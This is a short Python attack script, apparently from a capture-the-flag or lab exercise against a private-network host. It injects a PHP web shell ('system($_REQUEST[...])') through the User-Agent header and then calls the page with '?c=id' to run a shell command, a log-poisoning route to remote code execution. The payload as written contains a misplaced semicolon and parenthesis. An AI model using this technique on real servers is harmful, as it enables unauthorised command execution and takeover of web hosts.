#!/usr/bin/env python3

import requests

url = "http://10.10.90.182:8000"
url_= "https://10.10.90.182:1443/index.php"
header={'User-Agent':'<?php echo system($_REQUEST["c"];) ?>'}

r = requests.get(url_ + "?c=id", headers=header, verify=False)
print(r.text)
